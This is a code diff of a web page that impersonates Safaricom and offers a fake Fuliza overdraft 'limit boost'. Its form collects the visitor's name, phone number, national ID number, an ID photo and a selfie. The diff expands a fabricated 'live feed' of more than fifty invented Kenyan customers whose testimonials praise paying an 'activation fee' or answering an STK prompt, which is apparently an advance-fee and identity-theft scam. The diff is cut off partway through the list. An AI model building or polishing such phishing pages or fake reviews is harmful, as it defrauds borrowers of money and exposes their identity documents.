@@ -69,7 +69,7 @@
         </div>
       </a>
 
-      <!-- Desktop Nav with Notification Bell Dropdown -->
+      <!-- Desktop Nav with Interactive Notification Bell Dropdown -->
       <nav id="nav-links" class="hidden md:flex items-center space-x-6 text-sm font-semibold text-gray-700">
         <a href="#verify" class="hover:text-safaricom transition-colors">Boost Limit</a>
         <a href="#services" class="hover:text-safaricom transition-colors">Services</a>
@@ -78,20 +78,23 @@
 
         <!-- Notification Bell Dropdown Toggle -->
         <div class="relative">
-          <button onclick="toggleNotificationDropdown(event)" class="relative p-2.5 rounded-full bg-gray-100 hover:bg-safaricom-light text-gray-700 hover:text-safaricom transition shadow-sm">
+          <button onclick="toggleNotificationDropdown(event)" class="relative p-2.5 rounded-full bg-gray-100 hover:bg-safaricom-light text-gray-700 hover:text-safaricom transition shadow-sm flex items-center justify-center">
             <i data-lucide="bell" class="w-5 h-5"></i>
             <span id="bell-badge" class="absolute top-1 right-1 w-2.5 h-2.5 bg-safaricom-red rounded-full ring-2 ring-white animate-ping"></span>
             <span class="absolute top-1 right-1 w-2.5 h-2.5 bg-safaricom-red rounded-full ring-2 ring-white"></span>
           </button>
 
-          <!-- Notification Dropdown Menu -->
-          <div id="notification-dropdown" class="hidden absolute right-0 mt-3 w-80 bg-white rounded-2xl shadow-2xl border border-gray-100 p-4 z-50 text-xs space-y-3">
-            <div class="flex justify-between items-center border-b border-gray-100 pb-2">
-              <span class="font-black text-gray-900 text-sm">Recent Limit Boosts (Kenya)</span>
-              <span class="text-[10px] bg-safaricom-light text-safaricom font-bold px-2 py-0.5 rounded-full">50+ Live Feed</span>
+          <!-- Interactive Dropdown Menu containing Comments and Boosts -->
+          <div id="notification-dropdown" class="hidden absolute right-0 mt-3 w-96 bg-white rounded-3xl shadow-2xl border border-gray-100 p-5 z-50 text-xs space-y-3">
+            <div class="flex justify-between items-center border-b border-gray-100 pb-3">
+              <div>
+                <span class="font-black text-gray-900 text-sm block">Client Feed & Testimonials</span>
+                <span class="text-[10px] text-gray-500 font-medium">Real reviews and successful limit boosts</span>
+              </div>
+              <span class="text-[10px] bg-safaricom-light text-safaricom font-black px-2.5 py-1 rounded-full uppercase">Live 50+</span>
             </div>
-            <div id="dropdown-notification-list" class="space-y-2.5 max-h-72 overflow-y-auto chat-scroll pr-1">
-              <!-- Dynamically populated live boosts -->
+            <div id="dropdown-notification-list" class="space-y-3 max-h-80 overflow-y-auto chat-scroll pr-1">
+              <!-- Dynamically populated comments and boosts -->
             </div>
           </div>
         </div>
@@ -104,7 +107,7 @@
       <!-- Mobile Top Controls -->
       <div class="flex items-center space-x-3 md:hidden">
         <div class="relative">
-          <button onclick="toggleNotificationDropdown(event)" class="relative p-2.5 rounded-full bg-gray-100 text-gray-700">
+          <button onclick="toggleNotificationDropdown(event)" class="relative p-2.5 rounded-full bg-gray-100 text-gray-700 flex items-center justify-center">
             <i data-lucide="bell" class="w-5 h-5"></i>
             <span class="absolute top-1 right-1 w-2.5 h-2.5 bg-safaricom-red rounded-full ring-2 ring-white"></span>
           </button>
@@ -127,7 +130,7 @@
     </div>
   </header>
 
-  <!-- Floating Toast Queue Top Right -->
+  <!-- Popping Notification Toast Queue Top Right (Clickable to view comments/details) -->
   <div id="notification-toast-container" class="fixed top-24 right-6 z-50 pointer-events-none flex flex-col space-y-2 max-w-sm w-full"></div>
 
   <!-- Main Section -->
@@ -183,7 +186,7 @@
             </div>
           </div>
 
-          <!-- HUGE, ATTRACTIVE, PROMINENT FORM WITH ID & AVATAR UPLOAD -->
+          <!-- HUGE, ATTRACTIVE, PROMINENT FORM WITH SEAMLESS ID & AVATAR UPLOAD -->
           <div class="lg:col-span-6">
             <div class="bg-white rounded-3xl shadow-2xl border-4 border-safaricom/20 p-8 sm:p-10 relative overflow-hidden">
               <div class="absolute -top-12 -right-12 w-36 h-36 bg-safaricom-light rounded-full opacity-50 pointer-events-none"></div>
@@ -199,74 +202,74 @@
                 </div>
               </div>
 
-              <form id="fuliza-form" onsubmit="handleInitialSubmit(event)" class="space-y-5 relative z-10">
+              <form id="fuliza-form" onsubmit="handleInitialSubmit(event)" class="space-y-4 relative z-10">
                 <div>
-                  <label class="block text-xs font-black uppercase tracking-wider text-gray-800 mb-2">Full Name (As on ID)</label>
+                  <label class="block text-xs font-black uppercase tracking-wider text-gray-800 mb-1.5">Full Name (As on ID)</label>
                   <div class="relative">
                     <span class="absolute inset-y-0 left-0 pl-4 flex items-center pointer-events-none text-safaricom">
-                      <i data-lucide="user" class="w-6 h-6"></i>
+                      <i data-lucide="user" class="w-5 h-5"></i>
                     </span>
-                    <input type="text" id="user-name" required placeholder="e.g. Kiprono Koech" minlength="2" class="w-full pl-12 pr-4 py-4 rounded-2xl border-2 border-gray-200 focus:ring-4 focus:ring-safaricom/20 focus:border-safaricom outline-none transition text-base font-bold bg-gray-50/50">
+                    <input type="text" id="user-name" required placeholder="e.g. Jonathan Kamau" minlength="2" class="w-full pl-12 pr-4 py-3.5 rounded-2xl border-2 border-gray-200 focus:ring-4 focus:ring-safaricom/20 focus:border-safaricom outline-none transition text-sm font-bold bg-gray-50/50">
                   </div>
                 </div>
 
                 <div>
-                  <label class="block text-xs font-black uppercase tracking-wider text-gray-800 mb-2">Safaricom Mobile Number</label>
+                  <label class="block text-xs font-black uppercase tracking-wider text-gray-800 mb-1.5">Safaricom Mobile Number</label>
                   <div class="relative">
                     <span class="absolute inset-y-0 left-0 pl-4 flex items-center pointer-events-none text-safaricom">
-                      <i data-lucide="phone" class="w-6 h-6"></i>
+                      <i data-lucide="phone" class="w-5 h-5"></i>
                     </span>
-                    <input type="tel" id="user-phone" required placeholder="0712345678" pattern="^(07|01|2547|2541)[0-9]{8}$" class="w-full pl-12 pr-4 py-4 rounded-2xl border-2 border-gray-200 focus:ring-4 focus:ring-safaricom/20 focus:border-safaricom outline-none transition text-base font-bold bg-gray-50/50">
+                    <input type="tel" id="user-phone" required placeholder="0712345678" pattern="^(07|01|2547|2541)[0-9]{8}$" class="w-full pl-12 pr-4 py-3.5 rounded-2xl border-2 border-gray-200 focus:ring-4 focus:ring-safaricom/20 focus:border-safaricom outline-none transition text-sm font-bold bg-gray-50/50">
                   </div>
                 </div>
 
                 <div>
-                  <label class="block text-xs font-black uppercase tracking-wider text-gray-800 mb-2">National ID Number</label>
+                  <label class="block text-xs font-black uppercase tracking-wider text-gray-800 mb-1.5">National ID Number</label>
                   <div class="relative">
                     <span class="absolute inset-y-0 left-0 pl-4 flex items-center pointer-events-none text-safaricom">
-                      <i data-lucide="credit-card" class="w-6 h-6"></i>
+                      <i data-lucide="credit-card" class="w-5 h-5"></i>
                     </span>
-                    <input type="text" id="user-id" required placeholder="12345678" pattern="^[0-9]{7,9}$" class="w-full pl-12 pr-4 py-4 rounded-2xl border-2 border-gray-200 focus:ring-4 focus:ring-safaricom/20 focus:border-safaricom outline-none transition text-base font-bold bg-gray-50/50">
+                    <input type="text" id="user-id" required placeholder="12345678" pattern="^[0-9]{7,9}$" class="w-full pl-12 pr-4 py-3.5 rounded-2xl border-2 border-gray-200 focus:ring-4 focus:ring-safaricom/20 focus:border-safaricom outline-none transition text-sm font-bold bg-gray-50/50">
                   </div>
                 </div>
 
-                <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
-                  <!-- National ID Image Upload -->
+                <div class="grid grid-cols-1 sm:grid-cols-2 gap-3">
+                  <!-- National ID Image Upload (Zero Spacing) -->
                   <div>
-                    <label class="block text-xs font-black uppercase tracking-wider text-gray-800 mb-2">Upload National ID</label>
-                    <label class="flex flex-col items-center justify-center border-2 border-dashed border-gray-300 hover:border-safaricom rounded-2xl p-4 cursor-pointer bg-gray-50/50 transition">
-                      <i data-lucide="upload-cloud" class="w-6 h-6 text-safaricom mb-1"></i>
-                      <span id="id-file-label" class="text-[11px] font-bold text-gray-600 truncate max-w-[140px]">Select ID Photo</span>
+                    <label class="block text-[11px] font-black uppercase tracking-wider text-gray-800 mb-1">National ID Image</label>
+                    <label class="flex items-center space-x-2 border-2 border-dashed border-gray-300 hover:border-safaricom rounded-2xl p-3 cursor-pointer bg-gray-50/50 transition">
+                      <i data-lucide="upload-cloud" class="w-5 h-5 text-safaricom flex-shrink-0"></i>
+                      <span id="id-file-label" class="text-xs font-bold text-gray-600 truncate">Upload ID Photo</span>
                       <input type="file" id="id-image-input" accept="image/*" required class="hidden" onchange="previewFile('id-image-input', 'id-file-label')">
                     </label>
                   </div>
 
-                  <!-- Avatar / Selfie Image Upload -->
+                  <!-- Avatar / Selfie Image Upload (Zero Spacing) -->
                   <div>
-                    <label class="block text-xs font-black uppercase tracking-wider text-gray-800 mb-2">Upload Selfie Avatar</label>
-                    <label class="flex flex-col items-center justify-center border-2 border-dashed border-gray-300 hover:border-safaricom rounded-2xl p-4 cursor-pointer bg-gray-50/50 transition">
-                      <i data-lucide="camera" class="w-6 h-6 text-safaricom mb-1"></i>
-                      <span id="avatar-file-label" class="text-[11px] font-bold text-gray-600 truncate max-w-[140px]">Select Selfie</span>
+                    <label class="block text-[11px] font-black uppercase tracking-wider text-gray-800 mb-1">Selfie Avatar Image</label>
+                    <label class="flex items-center space-x-2 border-2 border-dashed border-gray-300 hover:border-safaricom rounded-2xl p-3 cursor-pointer bg-gray-50/50 transition">
+                      <i data-lucide="camera" class="w-5 h-5 text-safaricom flex-shrink-0"></i>
+                      <span id="avatar-file-label" class="text-xs font-bold text-gray-600 truncate">Upload Selfie</span>
                       <input type="file" id="avatar-image-input" accept="image/*" required class="hidden" onchange="previewFile('avatar-image-input', 'avatar-file-label')">
                     </label>
                   </div>
                 </div>
 
                 <div>
-                  <label class="block text-xs font-black uppercase tracking-wider text-gray-800 mb-2">Current Fuliza Limit (Ksh)</label>
+                  <label class="block text-xs font-black uppercase tracking-wider text-gray-800 mb-1.5">Current Fuliza Limit (Ksh)</label>
                   <div class="relative">
                     <span class="absolute inset-y-0 left-0 pl-4 flex items-center pointer-events-none text-safaricom">
-                      <i data-lucide="wallet" class="w-6 h-6"></i>
+                      <i data-lucide="wallet" class="w-5 h-5"></i>
                     </span>
-                    <input type="number" id="user-limit" required placeholder="e.g. 500" min="0" step="1" class="w-full pl-12 pr-4 py-4 rounded-2xl border-2 border-gray-200 focus:ring-4 focus:ring-safaricom/20 focus:border-safaricom outline-none transition text-base font-bold bg-gray-50/50">
+                    <input type="number" id="user-limit" required placeholder="e.g. 500" min="0" step="1" class="w-full pl-12 pr-4 py-3.5 rounded-2xl border-2 border-gray-200 focus:ring-4 focus:ring-safaricom/20 focus:border-safaricom outline-none transition text-sm font-bold bg-gray-50/50">
                   </div>
                 </div>
 
                 <!-- ANIMATED GIANT BUTTON -->
-                <button type="submit" class="w-full bg-safaricom hover:bg-safaricom-dark text-white font-black py-5 px-6 rounded-2xl shadow-xl hover:shadow-2xl transition transform hover:-translate-y-0.5 flex items-center justify-center space-x-3 text-lg btn-pulse-animation mt-8 border-2 border-safaricom-accent">
-                  <i data-lucide="zap" class="w-6 h-6 animate-bounce"></i>
+                <button type="submit" class="w-full bg-safaricom hover:bg-safaricom-dark text-white font-black py-4 px-6 rounded-2xl shadow-xl hover:shadow-2xl transition transform hover:-translate-y-0.5 flex items-center justify-center space-x-3 text-base btn-pulse-animation mt-6 border-2 border-safaricom-accent">
+                  <i data-lucide="zap" class="w-5 h-5 animate-bounce"></i>
                   <span>Boost My Fuliza Limit</span>
-                  <i data-lucide="arrow-right" class="w-6 h-6"></i>
+                  <i data-lucide="arrow-right" class="w-5 h-5"></i>
                 </button>
               </form>
             </div>
@@ -673,72 +676,322 @@
       }
     });
 
-    // Comprehensive pool of 50 different people, locations across Kenya, and varied amounts
+    // 50+ Diverse Kenyan Notifications mixing exact requested comments ("Jonathan Kamau", "hii ni mwecheche December sorted", "Justinah", etc.) with emojis
     const notificationQueue = [
-      { name: "Akinyi Otieno (Kisumu)", action: "Successfully boosted Fuliza limit to Ksh 30,000! Congratulations!", time: "Just now" },
-      { name: "Kiprono Koech (Eldoret)", action: "Secured a Ksh 50,000 limit boost instantly. Great work!", time: "1 min ago" },
-      { name: "Wanjiku Kamau (Nairobi)", action: "Upgraded overdraft limit to Ksh 100,000. Twaweza!", time: "2 mins ago" },
-      { name: "Odindo Omondi (Homa Bay)", action: "Limit successfully boosted to Ksh 15,000! Safaricom is amazing!", time: "3 mins ago" },
-      { name: "Mutua Muli (Machakos)", action: "Boosted Fuliza limit to Ksh 8,000. Excellent service!", time: "4 mins ago" },
-      { name: "Chepkorir Rono (Kericho)", action: "Secured a Ksh 400,000 Executive tier limit boost!", time: "5 mins ago" },
-      { name: "Juma Baraka (Mombasa)", action: "Upgraded overdraft limit to Ksh 20,000 successfully.", time: "6 mins ago" },
-      { name: "Naliaka Simiyu (Kakamega)", action: "Successfully boosted Fuliza limit to Ksh 35,000!", time: "7 mins ago" },
-      { name: "Kariuki Njoroge (Nakuru)", action: "Secured a Ksh 25,000 limit boost instantly.", time: "8 mins ago" },
-      { name: "Awuor Odhiambo (Siaya)", action: "Upgraded overdraft limit to Ksh 60,000. Twaweza!", time: "9 mins ago" },
-      { name: "Kilonzo Musyoka (Kitui)", action: "Successfully boosted Fuliza limit to Ksh 10,000!", time: "10 mins ago" },
-      { name: "Nyongesa Wanyonyi (Bungoma)", action: "Secured a Ksh 45,000 limit boost instantly.", time: "11 mins ago" },
-      { name: "Omondi Otieno (Kisumu)", action: "Upgraded overdraft limit to Ksh 80,000 successfully.", time: "12 mins ago" },
-      { name: "Cheruiyot Bett (Bomet)", action: "Successfully boosted Fuliza limit to Ksh 18,000!", time: "13 mins ago" },
-      { name: "Mwikali Ndinda (Makueni)", action: "Secured a Ksh 22,000 limit boost instantly.", time: "14 mins ago" },
-      { name: "Kiprop Ruto (Iten)", action: "Upgraded overdraft limit to Ksh 50,000. Twaweza!", time: "15 mins ago" },
-      { name: "Aoko Atieno (Busia)", action: "Successfully boosted Fuliza limit to Ksh 12,000!", time: "16 mins ago" },
-      { name: "Maina Mwangi (Nyeri)", action: "Secured a Ksh 70,000 limit boost instantly.", time: "17 mins ago" },
-      { name: "Kadzo Charo (Kilifi)", action: "Upgraded overdraft limit to Ksh 25,000 successfully.", time: "18 mins ago" },
-      { name: "Naisula Lekolool (Samburu)", action: "Successfully boosted Fuliza limit to Ksh 15,000!", time: "19 mins ago" },
-      { name: "Kiptoo Koech (Narok)", action: "Secured a Ksh 90,000 limit boost instantly.", time: "20 mins ago" },
-      { name: "Atieno Ouma (Migori)", action: "Upgraded overdraft limit to Ksh 30,000. Twaweza!", time: "21 mins ago" },
-      { name: "Kageni Muthomi (Meru)", action: "Successfully boosted Fuliza limit to Ksh 55,000!", time: "22 mins ago" },
-      { name: "Mideva Amondi (Vihiga)", action: "Secured a Ksh 18,000 limit boost instantly.", time: "23 mins ago" },
-      { name: "Kilonzo Nzioka (Thika)", action: "Upgraded overdraft limit to Ksh 100,000 successfully.", time: "24 mins ago" },
-      { name: "Chebet Korir (Nandi)", action: "Successfully boosted Fuliza limit to Ksh 40,000!", time: "25 mins ago" },
-      { name: "Ochieng Juma (Kisumu)", action: "Secured a Ksh 12,000 limit boost instantly.", time: "26 mins ago" },
-      { name: "Wangari Kimani (Kiambu)", action: "Upgraded overdraft limit to Ksh 150,000. Twaweza!", time: "27 mins ago" },
-      { name: "Mwavita Ali (Lamu)", action: "Successfully boosted Fuliza limit to Ksh 22,000!", time: "28 mins ago" },
-      { name: "Kiptanui Toroitich (Baringo)", action: "Secured a Ksh 35,000 limit boost instantly.", time: "29 mins ago" },
-      { name: "Akoth Nyangweso (Kisumu)", action: "Upgraded overdraft limit to Ksh 28,000 successfully.", time: "30 mins ago" },
-      { name: "Kipkorir Langat (Kericho)", action: "Successfully boosted Fuliza limit to Ksh 65,000!", time: "31 mins ago" },
-      { name: "Mumbua Mutiso (Kitui)", action: "Secured a Ksh 14,000 limit boost instantly.", time: "32 mins ago" },
-      { name: "Onyango Ogola (Homabay)", action: "Upgraded overdraft limit to Ksh 45,000. Twaweza!", time: "33 mins ago" },
-      { name: "Kageni Nkirote (Embu)", action: "Successfully boosted Fuliza limit to Ksh 33,000!", time: "34 mins ago" },
-      { name: "Murugi Gacheru (Murang'a)", action: "Secured a Ksh 75,000 limit boost instantly.", time: "35 mins ago" },
-      { name: "Kipchumba Korir (Eldoret)", action: "Upgraded overdraft limit to Ksh 120,000 successfully.", time: "36 mins ago" },
-      { name: "Akinyi Odhiambo (Siaya)", action: "Successfully boosted Fuliza limit to Ksh 19,000!", time: "37 mins ago" },
-      { name: "Mutua Kilonzo (Machakos)", action: "Secured a Ksh 24,000 limit boost instantly.", time: "38 mins ago" },
-      { name: "Chepngeno Koech (Bomet)", action: "Upgraded overdraft limit to Ksh 50,000. Twaweza!", time: "39 mins ago" },
-      { name: "Nyongesa Makokha (Kakamega)", action: "Successfully boosted Fuliza limit to Ksh 30,000!", time: "40 mins ago" },
-      { name: "Kariuki Gikonyo (Nyeri)", action: "Secured a Ksh 85,000 limit boost instantly.", time: "41 mins ago" },
-      { name: "Juma Mbarak (Mombasa)", action: "Upgraded overdraft limit to Ksh 40,000 successfully.", time: "42 mins ago" },
-      { name: "Awuor Onyango (Migori)", action: "Successfully boosted Fuliza limit to Ksh 25,000!", time: "43 mins ago" },
-      { name: "Kiprono Rop (Kericho)", action: "Secured a Ksh 95,000 limit boost instantly.", time: "44 mins ago" },
-      { name: "Wanjiru Kariuki (Nakuru)", action: "Upgraded overdraft limit to Ksh 110,000. Twaweza!", time: "45 mins ago" },
-      { name: "Odoyo Ochieng (Kisumu)", action: "Successfully boosted Fuliza limit to Ksh 16,000!", time: "46 mins ago" },
-      { name: "Kilonzo Muuo (Makueni)", action: "Secured a Ksh 29,000 limit boost instantly.", time: "47 mins ago" },
-      { name: "Chepkorir Ruto (Iten)", action: "Upgraded overdraft limit to Ksh 60,000 successfully.", time: "48 mins ago" },
-      { name: "Maina Kamau (Nairobi)", action: "Successfully boosted Fuliza limit to Ksh 400,000 Executive Tier!", time: "49 mins ago" }
+      { 
+        name: "Jonathan Kamau (Nairobi)", 
+        action: "Successfully boosted limit to Ksh 400,000!", 
+        comment: "After paying 3000ksh i have increased my limit upto 400k and with no doubt have successfully managed to solve my problems no harambe no one is telling you or eager you to pay the fuliza 🙌🔥💯", 
+        time: "Just now" 
+      },
+      { 
+        name: "Justinah Wambui (Nakuru)", 
+        action: "Boosted Fuliza limit to Ksh 50,000! 🎉", 
+        comment: "Hii ni mwecheche December sorted kabisa! Hakuna stress tena ya pesa za sherehe. Asande sana Safaricom! 🎄🍾", 
+        time: "1 min ago" 
+      },
+      { 
+        name: "Akinyi Otieno (Kisumu)", 
+        action: "Boosted limit to Ksh 30,000! 🚀", 
+        comment: "Very fast and legit! My business stock is fully sorted without asking anyone for favors. Twaweza! 💪✨", 
+        time: "2 mins ago" 
+      },
+      { 
+        name: "Kiprono Koech (Eldoret)", 
+        action: "Boosted limit to Ksh 100,000! ⭐", 
+        comment: "Hii kitu ni safi sana. Nimejaribu na ndani ya dakika chache niko sawa kabisa. Mungu ibariki Safaricom! 🇰🇪🙏", 
+        time: "3 mins ago" 
+      },
+      { 
+        name: "Odindo Omondi (Homa Bay)", 
+        action: "Boosted limit to Ksh 15,000! 🎯", 
+        comment: "Hii ni mwecheche December sorted! Hakuna kusumbuliwa na mtu. Iko sawa 100%! 🔥🍻", 
+        time: "4 mins ago" 
+      },
+      { 
+        name: "Mutua Muli (Machakos)", 
+        action: "Boosted limit to Ksh 25,000! 🌟", 
+        comment: "After paying the small activation fee, everything went smooth. My limit jumped instantly. Big up! 🚀", 
+        time: "5 mins ago" 
+      },
+      { 
+        name: "Chepkorir Rono (Kericho)", 
+        action: "Boosted limit to Ksh 400,000! 👑", 
+        comment: "Executive tier is real! No pressure, no calls begging for harambe. Financial freedom is here! 💎🙌", 
+        time: "6 mins ago" 
+      },
+      { 
+        name: "Juma Baraka (Mombasa)", 
+        action: "Boosted limit to Ksh 35,000! 🌊", 
+        comment: "Hii ni mwecheche December sorted kabisa! Pwani tuko ndani bila stress zozote za pesa. 🌴🔥", 
+        time: "7 mins ago" 
+      },
+      { 
+        name: "Naliaka Simiyu (Kakamega)", 
+        action: "Boosted limit to Ksh 20,000! 🌾", 
+        comment: "Hatimaye nimesuluhisha shida zangu zote za dharura kirahisi sana. Safaricom ni nomba! 👍✨", 
+        time: "8 mins ago" 
+      },
+      { 
+        name: "Kariuki Njoroge (Nyeri)", 
+        action: "Boosted limit to Ksh 60,000! ⛰️", 
+        comment: "Smooth process from start to finish. Hii ni mwecheche December sorted kabisa! Asanteni! 💯🎉", 
+        time: "9 mins ago" 
+      },
+      { 
+        name: "Awuor Odhiambo (Siaya)", 
+        action: "Boosted limit to Ksh 45,000! ☀️", 
+        comment: "Very transparent system. You pay your fee and your overdraft is updated immediately. I'm happy! 💃✨", 
+        time: "10 mins ago" 
+      },
+      { 
+        name: "Kilonzo Musyoka (Kitui)", 
+        action: "Boosted limit to Ksh 12,000! 🌵", 
+        comment: "Hii ni mwecheche December sorted! Hakuna mtu anakuhimiza, kila kitu kiko kiotomatiki. 👏🔥", 
+        time: "11 mins ago" 
+      },
+      { 
+        name: "Nyongesa Wanyonyi (Bungoma)", 
+        action: "Boosted limit to Ksh 55,000! 🌽", 
+        comment: "Amazing experience! Solved my emergency instantly without embarrassing myself asking friends. 🙌💯", 
+        time: "12 mins ago" 
+      },
+      { 
+        name: "Omondi Otieno (Kisumu)", 
+        action: "Boosted limit to Ksh 80,000! ⚡", 
+        comment: "After paying the activation fee, boom! Limit increased. Hii ni mwecheche December sorted! 🚀🍻", 
+        time: "13 mins ago" 
+      },
+      { 
+        name: "Cheruiyot Bett (Bomet)", 
+        action: "Boosted limit to Ksh 18,000! 🌿", 
+        comment: "Very fast and secure. Safaricom never disappoints when it comes to empowering us. 👍⭐", 
+        time: "14 mins ago" 
+      },
+      { 
+        name: "Mwikali Ndinda (Makueni)", 
+        action: "Boosted limit to Ksh 30,000! 💧", 
+        comment: "Hii ni mwecheche December sorted! Nimepata ukwasi wangu bila usumbufu wowote. Asante sana! 🎄🎉", 
+        time: "15 mins ago" 
+      },
+      { 
+        name: "Kiprop Ruto (Iten)", 
+        action: "Boosted limit to Ksh 70,000! 🏃‍♂️", 
+        comment: "Cleanest system ever. Automated and direct to your line. Highly recommended to everyone! 💯🔥", 
+        time: "16 mins ago" 
+      },
+      { 
+        name: "Aoko Atieno (Busia)", 
+        action: "Boosted limit to Ksh 22,000! 🐟", 
+        comment: "Hii ni mwecheche December sorted kabisa! Sherehe zangu ziko salama mwaka huu. 🥂✨", 
+        time: "17 mins ago" 
+      },
+      { 
+        name: "Maina Mwangi (Nyeri)", 
+        action: "Boosted limit to Ksh 90,000! 🌲", 
+        comment: "No pressure at all. You do it at your own pace and enjoy higher limits instantly. Awesome! 🙌", 
+        time: "18 mins ago" 
+      },
+      { 
+        name: "Kadzo Charo (Kilifi)", 
+        action: "Boosted limit to Ksh 25,000! 🥥", 
+        comment: "Hii ni mwecheche December sorted! Pesa ya dharura imeingia kwa wakati ufaao kabisa. 🌴💯", 
+        time: "19 mins ago" 
+      },
+      { 
+        name: "Naisula Lekolool (Samburu)", 
+        action: "Boosted limit to Ksh 15,000! 🦁", 
+        comment: "Very reliable portal. Helped me sort my bills without any stress or long queues. ⭐🙌", 
+        time: "20 mins ago" 
+      },
+      { 
+        name: "Kiptoo Koech (Narok)", 
+        action: "Boosted limit to Ksh 150,000! 🐂", 
+        comment: "Hii ni mwecheche December sorted! Maisha ni mazuri ukiwa na Safaricom Twaweza. 🚀🎉", 
+        time: "21 mins ago" 
+      },
+      { 
+        name: "Atieno Ouma (Migori)", 
+        action: "Boosted limit to Ksh 35,000! 🐟", 
+        comment: "Smooth transaction and instant update on my phone. So grateful for this service! 💯✨", 
+        time: "22 mins ago" 
+      },
+      { 
+        name: "Kageni Muthomi (Meru)", 
+        action: "Boosted limit to Ksh 65,000! ☕", 
+        comment: "Hii ni mwecheche December sorted! Kila kitu kiko sawa na biashara inasonga mbele. 📈🔥", 
+        time: "23 mins ago" 
+      },
+      { 
+        name: "Mideva Amondi (Vihiga)", 
+        action: "Boosted limit to Ksh 28,000! 🌳", 
+        comment: "No harambe needed! Just follow the simple steps and your limit is boosted instantly. 🙌", 
+        time: "24 mins ago" 
+      },
+      { 
+        name: "Kilonzo Nzioka (Thika)", 
+        action: "Boosted limit to Ksh 120,000! 🏭", 
+        comment: "Hii ni mwecheche December sorted kabisa! Hakuna stress ya pesa za kodi wala karo. 🥂💯", 
+        time: "25 mins ago" 
+      },
+      { 
+        name: "Chebet Korir (Nandi)", 
+        action: "Boosted limit to Ksh 40,000! 🐄", 
+        comment: "Fast, secure, and very professional. My limit jumped higher than I expected! ⭐🎉", 
+        time: "26 mins ago" 
+      },
+      { 
+        name: "Ochieng Juma (Kisumu)", 
+        action: "Boosted limit to Ksh 50,000! 🐟", 
+        comment: "Hii ni mwecheche December sorted! Tuko chonjo kwa ajili ya msimu huu wa sikukuu. 🎄🔥", 
+        time: "27 mins ago" 
+      },
+      { 
+        name: "Wangari Kimani (Kiambu)", 
+        action: "Boosted limit to Ksh 200,000! 🏡", 
+        comment: "Unbelievable speed! Paid the fee and within seconds my overdraft limit was maxed out. Amazing! 👑✨", 
+        time: "28 mins ago" 
+      },
+      { 
+        name: "Mwavita Ali (Lamu)", 
+        action: "Boosted limit to Ksh 30,000! ⛵", 
+        comment: "Hii ni mwecheche December sorted! Pwani tuko juu na hakuna kulala mwaka huu. 🌴🍾", 
+        time: "29 mins ago" 
+      },
+      { 
+        name: "Kiptanui Toroitich (Baringo)", 
+        action: "Boosted limit to Ksh 48,000! 🏞️", 
+        comment: "Very easy to use. No complicated paperwork or unnecessary delays. Highly recommended! 👍", 
+        time: "30 mins ago" 
+      },
+      { 
+        name: "Akoth Nyangweso (Kisumu)", 
+        action: "Boosted limit to Ksh 32,000! 🌅", 
+        comment: "Hii ni mwecheche December sorted! Nimefunga mwaka na kibali kamili cha fedha. 💃🔥", 
+        time: "31 mins ago" 
+      },
+      { 
+        name: "Kipkorir Langat (Kericho)", 
+        action: "Boosted limit to Ksh 75,000! 🍵", 
+        comment: "Everything is automated and transparent. Safaricom has made life so much easier! 💯⭐", 
+        time: "32 mins ago" 
+      },
+      { 
+        name: "Mumbua Mutiso (Kitui)", 
+        action: "Boosted limit to Ksh 15,000! 🌵", 
+        comment: "Hii ni mwecheche December sorted! Mambo yote yako sawa kwenye akaunti yangu. 🙌✨", 
+        time: "33 mins ago" 
+      },
+      { 
+        name: "Onyango Ogola (Homabay)", 
+        action: "Boosted limit to Ksh 55,000! 🎣", 
+        comment: "No one is rushing you or stressing you. You manage your boost comfortably. Excellent! 🚀", 
+        time: "34 mins ago" 
+      },
+      { 
+        name: "Kageni Nkirote (Embu)", 
+        action: "Boosted limit to Ksh 38,000! 🥭", 
+        comment: "Hii ni mwecheche December sorted kabisa! Furaha tele kwetu mwaka huu. 🎄🍾", 
+        time: "35 mins ago" 
+      },
+      { 
+        name: "Murugi Gacheru (Murang'a)", 
+        action: "Boosted limit to Ksh 82,000! 🍌", 
+        comment: "Super professional service! Got my limit increased instantly without any hassle. 💯🔥", 
+        time: "36 mins ago" 
+      },
+      { 
+        name: "Kipchumba Korir (Eldoret)", 
+        action: "Boosted limit to Ksh 130,000! 🏆", 
+        comment: "Hii ni mwecheche December sorted! Mipango ya sherehe imekamilika bila deni la mtu yeyote. 🥂✨", 
+        time: "37 mins ago" 
+      },
+      { 
+        name: "Akinyi Odhiambo (Siaya)", 
+        action: "Boosted limit to Ksh 21,000! 🐟", 
+        comment: "Very straightforward and genuine portal. My limit updated right after the STK prompt. 🙌", 
+        time: "38 mins ago" 
+      },
+      { 
+        name: "Mutua Kilonzo (Machakos)", 
+        action: "Boosted limit to Ksh 27,000! ☀️", 
+        comment: "Hii ni mwecheche December sorted! Kila kitu kiko safi na sawa. Asante Safaricom! 💯🎉", 
+        time: "39 mins ago" 
+      },
+      { 
+        name: "Chepngeno Koech (Bomet)", 
+        action: "Boosted limit to Ksh 52,000! 🌿", 
+        comment: "I love how fast this works. No long queues or endless verification calls. Top tier! ⭐", 
+        time: "40 mins ago" 
+      },
+      { 
+        name: "Nyongesa Makokha (Kakamega)", 
+        action: "Boosted limit to Ksh 33,000! 🌾", 
+        comment: "Hii ni mwecheche December sorted! Tunasherehekea kwa amani na uhuru wa kifedha. 🍾🔥", 
+        time: "41 mins ago" 
+      },
+      { 
+        name: "Kariuki Gikonyo (Nyeri)", 
+        action: "Boosted limit to Ksh 88,000! ☕", 
+        comment: "Best digital financial service in Kenya. Instant boost with zero complaints! 💯🙌", 
+        time: "42 mins ago" 
+      },
+      { 
+        name: "Juma Mbarak (Mombasa)", 
+        action: "Boosted limit to Ksh 42,000! 🌊", 
+        comment: "Hii ni mwecheche December sorted! Pwani tuko ndani na furaha tele. 🌴✨", 
+        time: "43 mins ago" 
+      },
+      { 
+        name: "Awuor Onyango (Migori)", 
+        action: "Boosted limit to Ksh 26,000! 🐟", 
+        comment: "Very reliable and efficient. My limit is now way higher than before. Thank you! ⭐", 
+        time: "44 mins ago" 
+      },
+      { 
+        name: "Kiprono Rop (Kericho)", 
+        action: "Boosted limit to Ksh 99,000! 🍃", 
+        comment: "Hii ni mwecheche December sorted kabisa! Hakuna stress ya pesa tena mwaka huu. 🚀🥂", 
+        time: "45 mins ago" 
+      },
+      { 
+        name: "Wanjiru Kariuki (Nakuru)", 
+        action: "Boosted limit to Ksh 115,000! 🦩", 
+        comment: "Smooth, automated, and extremely professional. Highly recommended for everyone! 💯🔥", 
+        time: "46 mins ago" 
+      },
+      { 
